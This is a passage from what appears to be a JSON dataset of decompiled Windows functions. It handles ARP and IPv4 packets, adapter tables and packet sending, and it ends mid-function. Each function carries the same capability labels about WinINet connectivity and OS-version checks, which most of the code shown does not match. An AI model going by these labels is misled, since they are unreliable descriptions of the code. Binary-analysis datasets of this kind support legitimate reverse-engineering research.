        "decompiled_code": "\nuint __cdecl fcn.0004c3b0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint var_b8h;\n    uint var_b0h;\n    int16_t *var_ach;\n    uint var_a8h;\n    uint var_a0h;\n    int16_t *var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    int32_t *var_8ch;\n    int32_t *var_88h;\n    uint32_t var_84h;\n    uint var_80h;\n    uint var_78h;\n    int16_t *var_74h;\n    uint var_70h;\n    uint var_68h;\n    int16_t *var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uchar var_15h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_24h = 0;\n    *arg_14h = 3;\n    var_ch = 0;\n    var_8h = 0;\n    var_14h = 7;\n    var_10h = &var_5ch;\n    fcn.00078790(&var_5ch, 0, 0x38);\n    *var_10h = 0x3b;\n    var_10h[1] = 4;\n    var_10h[2] = 0x27;\n    var_10h[3] = 2;\n    var_10h[4] = 0x3d;\n    var_10h[5] = 4;\n    var_10h[6] = 0x41;\n    var_10h[7] = 2;\n    var_10h[8] = 0x42;\n    var_10h[9] = 2;\n    var_10h[10] = 0x43;\n    var_10h[0xb] = 2;\n    var_10h[0xc] = 1;\n    var_10h[0xd] = 8;\n    var_15h = (**0xb1bde00c)();\n    var_1ch = 0;\n    fcn.0004e630(*0xb1c5a710, &var_1ch, 0);\n    if (var_1ch != 0) {\n        var_24h = fcn.00035230(var_1ch * 0x28);\n        if (var_24h == 0) {\n            (**0xb1bde010)();\n            var_60h = 0x21590004;\n            goto code_r0x0004cad3;\n        }\n        fcn.00078790(var_24h, 0, var_1ch * 0x28);\n        var_1ch = 0;\n        fcn.0004e630(*0xb1c5a710, &var_1ch, var_24h);\n    }\n    (**0xb1bde010)();\n    var_ch = var_1ch;\n    var_8h = fcn.000352f0(var_1ch, 4);\n    if (var_8h == 0) {\n        var_60h = 0x21590004;\n    }\n    else {\n        for (var_20h = 0; var_20h < var_1ch; var_20h = var_20h + 1) {\n            uVar2 = fcn.00035200(var_14h * 0x10 + 0x44);\n            *(var_8h + var_20h * 4) = uVar2;\n            if (*(var_8h + var_20h * 4) == 0) {\n                var_60h = 0x21590004;\n                goto code_r0x0004cad3;\n            }\n            fcn.00078790(*(var_8h + var_20h * 4), 0, var_14h << 4);\n            var_4h = var_14h * 0x10 + *(var_8h + var_20h * 4);\n            fcn.000785aa(var_4h, 0xb1be2550, *(var_24h + 8 + var_20h * 0x28), *(var_24h + 9 + var_20h * 0x28), \n                         *(var_24h + 10 + var_20h * 0x28), *(var_24h + 0xb + var_20h * 0x28));\n            *(*(var_8h + var_20h * 4) + 4) = var_4h;\n            var_64h = var_4h;\n            do {\n                iVar1 = *var_64h;\n                var_64h = var_64h + 1;\n            } while (iVar1 != 0);\n            **(var_8h + var_20h * 4) = (var_64h - (var_4h + 1) >> 1) * 2 + 2;\n            var_74h = var_4h;\n            do {\n                iVar1 = *var_74h;\n                var_74h = var_74h + 1;\n            } while (iVar1 != 0);\n            var_4h = var_4h + (var_74h - (var_4h + 1) >> 1) + 1;\n            *(*(var_8h + var_20h * 4) + 0x14) = *(var_8h + var_20h * 4) + 0x18;\n            *(*(var_8h + var_20h * 4) + 0x10) = 4;\n            **(*(var_8h + var_20h * 4) + 0x14) = *(var_24h + 0xc + var_20h * 0x28);\n            var_88h = 0xb1c5b700;\n            var_8ch = var_24h + 0x10 + var_20h * 0x28;\n            for (var_84h = 6; 3 < var_84h; var_84h = var_84h - 4) {\n                if (*var_8ch != *var_88h) goto code_r0x0004c746;\n                var_88h = var_88h + 1;\n                var_8ch = var_8ch + 1;\n            }\n            if (var_84h == 0) {\ncode_r0x0004c81c:\n                var_94h = 0;\n            }\n            else {\ncode_r0x0004c746:\n                var_90h = *var_8ch - *var_88h;\n                if (var_90h == 0) {\n                    if (var_84h == 1) goto code_r0x0004c81c;\n                    var_90h = *(var_8ch + 1) - *(var_88h + 1);\n                    if (var_90h == 0) {\n                        if (var_84h == 2) goto code_r0x0004c81c;\n                        var_90h = *(var_8ch + 2) - *(var_88h + 2);\n                        if (var_90h == 0) {\n                            if ((var_84h == 3) || (var_90h = *(var_8ch + 3) - *(var_88h + 3),  var_90h == 0))\n                            goto code_r0x0004c81c;\n                        }\n                    }\n                }\n                var_94h = 1;\n                if (var_90h < 1) {\n                    var_94h = -1;\n                }\n            }\n            if (var_94h == 0) {\n                *var_4h = 0;\n            }\n            else {\n                fcn.000785aa(var_4h, 0xb1be1f44, *(var_24h + 0x10 + var_20h * 0x28), *(var_24h + 0x11 + var_20h * 0x28)\n                             , *(var_24h + 0x12 + var_20h * 0x28), *(var_24h + 0x13 + var_20h * 0x28), \n                             *(var_24h + 0x14 + var_20h * 0x28), *(var_24h + 0x15 + var_20h * 0x28));\n            }\n            *(*(var_8h + var_20h * 4) + 0x24) = var_4h;\n            var_9ch = var_4h;\n            do {\n                iVar1 = *var_9ch;\n                var_9ch = var_9ch + 1;\n            } while (iVar1 != 0);\n            *(*(var_8h + var_20h * 4) + 0x20) = (var_9ch - (var_4h + 1) >> 1) * 2 + 2;\n            var_ach = var_4h;\n            do {\n                iVar1 = *var_ach;\n                var_ach = var_ach + 1;\n            } while (iVar1 != 0);\n            var_4h = var_4h + (var_ach - (var_4h + 1) >> 1) + 1;\n            *(*(var_8h + var_20h * 4) + 0x34) = *(var_8h + var_20h * 4) + 0x38;\n            *(*(var_8h + var_20h * 4) + 0x30) = 4;\n            **(*(var_8h + var_20h * 4) + 0x34) = *(var_24h + 0x18 + var_20h * 0x28);\n            *(*(var_8h + var_20h * 4) + 0x44) = *(var_8h + var_20h * 4) + 0x48;\n            *(*(var_8h + var_20h * 4) + 0x40) = 4;\n            **(*(var_8h + var_20h * 4) + 0x44) = *(var_24h + 0x1c + var_20h * 0x28);\n            *(*(var_8h + var_20h * 4) + 0x54) = *(var_8h + var_20h * 4) + 0x58;\n            *(*(var_8h + var_20h * 4) + 0x50) = 4;\n            **(*(var_8h + var_20h * 4) + 0x54) = *(var_24h + 0x20 + var_20h * 0x28);\n            *(*(var_8h + var_20h * 4) + 100) = *(var_8h + var_20h * 4) + 0x68;\n            *(*(var_8h + var_20h * 4) + 0x60) = 4;\n            **(*(var_8h + var_20h * 4) + 100) = *(var_24h + 0x24 + var_20h * 0x28);\n        }\n        var_60h = fcn.0002ee00(&var_14h, arg_18h, arg_1ch);\n    }\ncode_r0x0004cad3:\n    if (var_8h != 0) {\n        for (var_20h = 0; var_20h < var_ch; var_20h = var_20h + 1) {\n            fcn.00035330(*(var_8h + var_20h * 4));\n        }\n    }\n    fcn.00035330(var_8h);\n    if (var_24h != 0) {\n        fcn.00035330(var_24h);\n    }\n    return var_60h;\n}\n",
        "token_count": 2837
    },
    "0004cc60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_e8h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0004cc60(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    int32_t var_d0h;\n    uint var_cch;\n    code *var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    ushort var_bch;\n    uint var_bah;\n    uint var_b6h;\n    uint var_ach;\n    uint var_a6h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_84h;\n    ushort var_80h;\n    uint var_7eh;\n    uint var_7ah;\n    uint var_70h;\n    uint var_6ah;\n    uint var_64h;\n    uint var_60h;\n    int32_t var_48h;\n    uint var_44h;\n    code *var_40h;\n    uint var_3ch;\n    uint *var_38h;\n    code *var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar var_9h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_28h = 0;\n    var_10h = 0;\n    var_4h = 0;\n    var_38h = NULL;\n    var_20h = NULL;\n    var_30h = 0;\n    var_2ch = 0;\n    var_48h = 0;\n    var_44h = 0;\n    var_34h = NULL;\n    var_40h = NULL;\n    do {\n        if (*0xb1c67798 != '\\0') {\n            return 0;\n        }\n        do {\n            var_14h = (*0xb1bde158)[1];\n            var_18h = **0xb1bde158;\n        } while (var_14h != (*0xb1bde158)[2]);\n        uVar3 = (**0xb1bde154)();\n        _var_18h = fcn.00078778(var_18h, var_14h, uVar3, 0);\n        var_9h = (**0xb1bde00c)();\n        var_24h = 0xffffffff;\n        for (var_1ch = 0; var_1ch < 0x40; var_1ch = var_1ch + 1) {\n            if ((*(var_1ch * 0x30 + -0x4e398848) != 0) && (*(var_1ch * 0x30 + -0x4e398843) != '\\0')) {\n                fcn.00037150(0xb1c5b4c0, &var_3ch, 0);\n                var_28h = fcn.0003da90(*(var_1ch * 0x30 + -0x4e398848), 1);\n                if (var_28h == 0) {\n                    var_d0h = 0;\n                }\n                else {\n                    var_d0h = *(var_28h + 8);\n                }\n                var_8h = var_d0h;\n                fcn.00037180(0xb1c5b4c0, &var_3ch, 0);\n                if (var_28h != 0) {\n                    if (var_8h == 0) {\n                        var_c8h = 0xb1c1a840;\n                        var_34h = 0xb1c1a2d0;\n                        var_40h = 0xb1c1a290;\n                        var_38h = &var_30h;\n                        var_20h = &var_48h;\n                        var_30h = 0;\n                        var_2ch = 0;\n                        var_48h = 0;\n                        var_44h = 0;\n                    }\n                    else {\n                        var_c8h = 0xb1c084d0;\n                        var_34h = 0xb1c09bc0;\n                        var_40h = 0xb1c09bf0;\n                        var_38h = &var_10h;\n                        var_20h = &var_4h;\n                        var_10h = 0;\n                        var_4h = 0;\n                    }\n                    iVar4 = *(var_1ch * 0x30 + -0x4e39883c);\n                    if ((var_14h < iVar4) || ((var_14h <= iVar4 && (var_18h < *(var_1ch * 0x30 + -0x4e398840))))) {\n                        iVar4 = *(var_1ch * 0x30 + -0x4e39883c);\n                        if ((var_14h <= iVar4) && ((var_14h < iVar4 || (var_18h <= *(var_1ch * 0x30 + -0x4e398840))))) {\n                            uVar2 = *(var_1ch * 0x30 + -0x4e398840);\n                            iVar7 = fcn.00078784(uVar2 - var_18h, \n                                                 (*(var_1ch * 0x30 + -0x4e39883c) - var_14h) - (uVar2 < var_18h), 10000\n                                                 , 0);\n                            if ((iVar7 < 0x100000000) && ((iVar7 < 0 || (iVar7 < var_24h)))) {\n                                uVar2 = *(var_1ch * 0x30 + -0x4e398840);\n                                var_24h = fcn.00078784(uVar2 - var_18h, \n                                                       (*(var_1ch * 0x30 + -0x4e39883c) - var_14h) - (uVar2 < var_18h), \n                                                       10000, 0);\n                            }\n                        }\n                    }\n                    else {\n                        iVar5 = var_1ch * 0x30;\n                        iVar4 = fcn.000785f8();\n                        iVar4 = iVar4 % 18000 + 2000;\n                        uVar6 = fcn.00078778(iVar4, iVar4 >> 0x1f, 10000, 0);\n                        puVar1 = iVar5 + -0x4e398840;\n                        uVar2 = *puVar1;\n                        iVar4 = *(iVar5 + -0x4e39883c);\n                        *(var_1ch * 0x30 + -0x4e398840) = uVar6 + *puVar1;\n                        *(var_1ch * 0x30 + -0x4e39883c) = iVar4 + (uVar6 >> 0x20) + CARRY4(uVar6, uVar2);\n                        iVar4 = (*var_c8h)(&var_c0h, *(var_1ch * 0x30 + -0x4e398848), var_38h);\n                        if (iVar4 == 0) {\n                            var_bah = *(var_28h + 0x10);\n                            var_b6h._0_2_ = *(var_28h + 0x14);\n                            var_c0h = *(var_1ch * 0x30 + -0x4e398850);\n                            var_bch = *(var_1ch * 0x30 + -0x4e39884c);\n                            if (*(var_1ch * 0x30 + -0x4e398844) == '\\0') {\n                                var_ach._0_2_ = fcn.000354c0(2);\n                                unique0x00007a00 = *(var_28h + 0x10);\n                                var_a6h._0_2_ = *(var_28h + 0x14);\n                                unique0x00007a00 = *(var_1ch * 0x30 + -0x4e398860);\n                                var_a0h = *(var_1ch * 0x30 + -0x4e398850);\n                                var_9ch._0_2_ = *(var_1ch * 0x30 + -0x4e39884c);\n                                unique0x00007a00 = *(var_1ch * 0x30 + -0x4e398854);\n                            }\n                            else {\n                                var_ach._0_2_ = fcn.000354c0(1);\n                                unique0x00007a00 = *(var_28h + 0x10);\n                                var_a6h._0_2_ = *(var_28h + 0x14);\n                                unique0x00007a00 = *(var_1ch * 0x30 + -0x4e398860);\n                                unique0x00007a00 = *(var_1ch * 0x30 + -0x4e398854);\n                            }\n                            iVar4 = (*var_c8h)(&var_84h, *(var_1ch * 0x30 + -0x4e398848), var_20h);\n                            if (iVar4 == 0) {\n                                var_7eh = *(var_28h + 0x10);\n                                var_7ah._0_2_ = *(var_28h + 0x14);\n                                var_84h = *(var_1ch * 0x30 + -0x4e39885c);\n                                var_80h = *(var_1ch * 0x30 + -0x4e398858);\n                                if (*(var_1ch * 0x30 + -0x4e398844) == '\\0') {\n                                    var_70h._0_2_ = fcn.000354c0(2);\n                                    unique0x00007a00 = *(var_28h + 0x10);\n                                    var_6ah._0_2_ = *(var_28h + 0x14);\n                                    unique0x00007a00 = *(var_1ch * 0x30 + -0x4e398854);\n                                    var_64h = *(var_1ch * 0x30 + -0x4e39885c);\n                                    var_60h._0_2_ = *(var_1ch * 0x30 + -0x4e398858);\n                                    unique0x00007a00 = *(var_1ch * 0x30 + -0x4e398860);\n                                }\n                                else {\n                                    var_70h._0_2_ = fcn.000354c0(1);\n                                    unique0x00007a00 = *(var_28h + 0x10);\n                                    var_6ah._0_2_ = *(var_28h + 0x14);\n                                    unique0x00007a00 = *(var_1ch * 0x30 + -0x4e398854);\n                                    unique0x00007a00 = *(var_1ch * 0x30 + -0x4e398860);\n                                }\n                                break;\n                            }\n                            (*var_40h)(*(var_1ch * 0x30 + -0x4e398848), var_38h);\n                        }\n                    }\n                }\n            }\n        }\n        (**0xb1bde010)();\n        if ((((var_30h == 0) && (var_48h == 0)) && (var_10h == 0)) && (var_4h == 0)) {\n            fcn.000340e0(0xb1c67794, var_24h);\n        }\n        else {\n            if ((var_30h != 0) || (var_10h != 0)) {\n                (*var_34h)(*(var_1ch * 0x30 + -0x4e398848), var_38h, 0xb1be2568);\n            }\n            if ((var_48h != 0) || (var_4h != 0)) {\n                (*var_34h)(*(var_1ch * 0x30 + -0x4e398848), var_20h, 0xb1be2570);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 2869
    },
    "0004d2d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004d2d0(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0003da90(arg_8h, 0);\n    if ((iVar1 != 0) && (*arg_ch != 0)) {\n        iVar1 = (**(*(iVar1 + 0x430) + 0x30))(*(*(iVar1 + 0x430) + 4), *arg_ch);\n        if (iVar1 == 0x103) {\n            fcn.000340e0(*arg_ch + 0x3c, 0xffffffff);\n        }\n        fcn.0004d290(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0004d370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004d370(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n    iVar1 = fcn.0003da90(arg_8h, 1);\n    if (iVar1 == 0) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = *(iVar1 + 8);\n    }\n    var_4h = var_10h;\n    fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n    if (iVar1 != 0) {\n        if (var_4h == 0) {\n            fcn.0004d410(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n        else {\n            fcn.0003b9c0(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "0004d410": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0004d410(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t *var_4ch;\n    int32_t *var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t *var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0;\n    iVar1 = *(arg_ch + 0xc);\n    iVar2 = fcn.000354c0(0x806);\n    if ((iVar1 == iVar2) && (0x1b < arg_14h)) {\n        fcn.0004dd80(arg_8h, arg_ch, arg_10h);\n    }\n    else if ((*0xb1c683a4 == '\\0') && (iVar1 = *(arg_ch + 0xc),  iVar2 = fcn.000354c0(0x800),  iVar1 == iVar2)) {\n        var_14h = arg_10h;\n        var_1h._0_1_ = (**0xb1bde00c)();\n        for (var_8h = 0; var_8h < 0x40; var_8h = var_8h + 1) {\n            if (*(var_8h * 0x30 + -0x4e398848) == arg_8h) {\n                if ((*(var_14h + 0xc) == *(var_8h * 0x30 + -0x4e398860)) &&\n                   (*(var_14h + 0x10) == *(var_8h * 0x30 + -0x4e398854))) {\n                    var_30h = var_8h * 0x30 + -0x4e39885c;\n                    var_34h = arg_ch + 6;\n                    for (var_2ch = 6; 3 < var_2ch; var_2ch = var_2ch - 4) {\n                        if (*var_34h != *var_30h) goto code_r0x0004d53c;\n                        var_30h = var_30h + 1;\n                        var_34h = var_34h + 1;\n                    }\n                    if (var_2ch == 0) {\ncode_r0x0004d5be:\n                        var_3ch = 0;\n                    }\n                    else {\ncode_r0x0004d53c:\n                        var_38h = *var_34h - *var_30h;\n                        if (var_38h == 0) {\n                            if (var_2ch == 1) goto code_r0x0004d5be;\n                            var_38h = *(var_34h + 1) - *(var_30h + 1);\n                            if (var_38h == 0) {\n                                if (var_2ch == 2) goto code_r0x0004d5be;\n                                var_38h = *(var_34h + 2) - *(var_30h + 2);\n                                if (var_38h == 0) {\n                                    if ((var_2ch == 3) || (var_38h = *(var_34h + 3) - *(var_30h + 3),  var_38h == 0))\n                                    goto code_r0x0004d5be;\n                                }\n                            }\n                        }\n                        var_3ch = 1;\n                        if (var_38h < 1) {\n                            var_3ch = -1;\n                        }\n                    }\n                    if (var_3ch != 0) goto code_r0x0004d62f;\n                    var_28h = *(var_8h * 0x30 + -0x4e398850);\n                    var_24h._0_2_ = *(var_8h * 0x30 + -0x4e39884c);\n                    *(var_8h * 0x30 + -0x4e398838) = *(var_8h * 0x30 + -0x4e398838) + 1;\ncode_r0x0004d79d:\n                    var_20h._2_2_ = 0;\n                    var_20h._0_2_ = 0;\n                    var_24h._2_2_ = 0;\n                    var_1ch._0_2_ = *(arg_ch + 0xc);\n                    fcn.00037150(0xb1c5b4c0, &var_10h, 0);\n                    var_ch = fcn.0003da90(arg_8h, 1);\n                    if (var_ch == 0) {\n                        var_5ch = 0;\n                    }\n                    else {\n                        var_5ch = *(var_ch + 0x430);\n                    }\n                    var_18h = var_5ch;\n                    if (var_ch != 0) {\n                        var_24h._2_2_ = *(var_ch + 0x10);\n                        var_20h._0_2_ = *(var_ch + 0x10) >> 0x10;\n                        var_20h._2_2_ = *(var_ch + 0x14);\n                    }\n                    fcn.00037180(0xb1c5b4c0, &var_10h, 0);\n                    fcn.0004d980(var_18h, &var_28h, arg_10h, arg_14h);\n                }\n                else {\ncode_r0x0004d62f:\n                    if ((*(var_14h + 0xc) == *(var_8h * 0x30 + -0x4e398854)) &&\n                       (*(var_14h + 0x10) == *(var_8h * 0x30 + -0x4e398860))) {\n                        var_48h = var_8h * 0x30 + -0x4e398850;\n                        var_4ch = arg_ch + 6;\n                        for (var_44h = 6; 3 < var_44h; var_44h = var_44h - 4) {\n                            if (*var_4ch != *var_48h) goto code_r0x0004d6a8;\n                            var_48h = var_48h + 1;\n                            var_4ch = var_4ch + 1;\n                        }\n                        if (var_44h == 0) {\ncode_r0x0004d72a:\n                            var_54h = 0;\n                        }\n                        else {\ncode_r0x0004d6a8:\n                            var_50h = *var_4ch - *var_48h;\n                            if (var_50h == 0) {\n                                if (var_44h == 1) goto code_r0x0004d72a;\n                                var_50h = *(var_4ch + 1) - *(var_48h + 1);\n                                if (var_50h == 0) {\n                                    if (var_44h == 2) goto code_r0x0004d72a;\n                                    var_50h = *(var_4ch + 2) - *(var_48h + 2);\n                                    if (var_50h == 0) {\n                                        if ((var_44h == 3) || (var_50h = *(var_4ch + 3) - *(var_48h + 3),  var_50h == 0)\n                                           ) goto code_r0x0004d72a;\n                                    }\n                                }\n                            }\n                            var_54h = 1;\n                            if (var_50h < 1) {\n                                var_54h = -1;\n                            }\n                        }\n                        if (var_54h == 0) {\n                            var_28h = *(var_8h * 0x30 + -0x4e39885c);\n                            var_24h._0_2_ = *(var_8h * 0x30 + -0x4e398858);\n                            *(var_8h * 0x30 + -0x4e398834) = *(var_8h * 0x30 + -0x4e398834) + 1;\n                            goto code_r0x0004d79d;\n                        }\n                    }\n                }\n            }\n        }\n        (**0xb1bde010)();\n    }\n    return;\n}\n",
        "token_count": 2057
    },
    "0004d840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004d840(int32_t arg_8h, uint noname_1, int32_t *arg_10h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t **var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = arg_10h;\n    (**0xb1bde024)(&var_8h, arg_10h + 1, *0xb1c5b714, arg_8h, 0x3c);\n    if (var_8h == 0) {\n        (**0xb1bde05c)(&var_8h, var_4h, *0xb1c5b718);\n        if (var_8h == 0) {\n            *(*var_4h + 0x38) = 0;\n            fcn.00033ff0(*var_4h + 0x3c);\n            for (var_ch = var_4h[1]; *var_ch != NULL; var_ch = *var_ch) {\n            }\n            if (*(*var_4h + 8) == 0) {\n                *(*var_4h + 0xc) = var_ch;\n            }\n            *var_ch = *(*var_4h + 8);\n            *(*var_4h + 8) = var_4h[1];\n            *(*var_4h + 0x1c) = 0;\n            fcn.00078790(arg_8h, 0, 0x3c);\n            uVar1 = fcn.000354c0(0x806);\n            *(arg_8h + 0xc) = uVar1;\n            uVar1 = fcn.000354c0(1);\n            *(arg_8h + 0xe) = uVar1;\n            uVar1 = fcn.000354c0(0x800);\n            *(arg_8h + 0x10) = uVar1;\n            *(arg_8h + 0x12) = 6;\n            *(arg_8h + 0x13) = 4;\n            uVar2 = 0;\n        }\n        else {\n            (**0xb1bde2ac)(var_4h[1]);\n            uVar2 = 0xc0000001;\n        }\n    }\n    else {\n        uVar2 = 0xc0000001;\n    }\n    return uVar2;\n}\n",
        "token_count": 552
    },
    "0004d980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0004d980(int32_t arg_8h, uint *arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t **var_14h;\n    int32_t var_10h;\n    int32_t **var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_ch = NULL;\n    var_10h = 0;\n    var_4h = fcn.00035230(arg_14h + 0xe);\n    if (var_4h == NULL) {\n        var_8h = -0x3fffff66;\n    }\n    else {\n        *var_4h = *arg_ch;\n        var_4h[1] = arg_ch[1];\n        var_4h[2] = arg_ch[2];\n        *(var_4h + 3) = *(arg_ch + 3);\n        fcn.0007877e(var_4h + 0xe, arg_10h, arg_14h);\n        (**0xb1bde024)(&var_8h, &var_ch, *0xb1c5b714, var_4h, arg_14h + 0xe);\n        if ((var_8h == 0) && ((**0xb1bde05c)(&var_8h, &var_10h, *0xb1c5b718),  var_8h == 0)) {\n            *(var_10h + 0x38) = 0x70724152;\n            fcn.00033ff0(var_10h + 0x3c);\n            for (var_14h = var_ch; *var_14h != NULL; var_14h = *var_14h) {\n            }\n            if (*(var_10h + 8) == 0) {\n                *(var_10h + 0xc) = var_14h;\n            }\n            *var_14h = *(var_10h + 8);\n            *(var_10h + 8) = var_ch;\n            *(var_10h + 0x1c) = 0;\n            var_8h = (**(arg_8h + 0x30))(*(arg_8h + 4), var_10h);\n            if (var_8h == 0x103) {\n                var_10h = 0;\n                var_ch = NULL;\n                var_4h = NULL;\n                var_8h = 0;\n            }\n        }\n        if (var_10h != 0) {\n            fcn.00034080(var_10h + 0x3c);\n            (**0xb1bde060)(var_10h);\n        }\n        if (var_ch != NULL) {\n            (**0xb1bde2ac)(var_ch);\n        }\n        if (var_4h != NULL) {\n            fcn.00035330(var_4h);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 672
    },
    "0004dcc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004dcc0(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(arg_8h + 8);\n    if (puVar1 == NULL) {\n        var_8h = 0;\n    }\n    else {\n        if ((*(puVar1 + 6) & 5) == 0) {\n            var_18h = (**0xb1bde224)(puVar1, 0);\n        }\n        else {\n            var_18h = puVar1[3];\n        }\n        var_8h = var_18h;\n        for (var_14h = *puVar1; var_14h != NULL; var_14h = *var_14h) {\n        }\n    }\n    fcn.00035330(var_8h);\n    (**0xb1bde2ac)(puVar1);\n    (**0xb1bde060)(arg_8h);\n    return;\n}\n",
        "token_count": 258
    },
    "0004dd80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004dd80(uint arg_8h, int32_t *arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t *var_28h;\n    int32_t *var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *arg_10h;\n    iVar2 = fcn.000354c0(1);\n    if (iVar1 != iVar2) {\n        return;\n    }\n    iVar1 = arg_10h[1];\n    iVar2 = fcn.000354c0(0x800);\n    if (iVar1 != iVar2) {\n        return;\n    }\n    if (*(arg_10h + 2) != '\\x06') {\n        return;\n    }\n    if (*(arg_10h + 5) != '\\x04') {\n        return;\n    }\n    iVar1 = arg_10h[3];\n    iVar2 = fcn.000354c0(1);\n    if (iVar1 != iVar2) goto code_r0x0004e001;\n    var_ch = 0xb1c57d10;\n    var_10h = arg_ch;\n    for (var_8h = 6; 3 < var_8h; var_8h = var_8h - 4) {\n        if (*var_10h != *var_ch) goto code_r0x0004de27;\n        var_ch = var_ch + 1;\n        var_10h = var_10h + 1;\n    }\n    if (var_8h == 0) {\ncode_r0x0004dea9:\n        var_18h = 0;\n    }\n    else {\ncode_r0x0004de27:\n        var_14h = *var_10h - 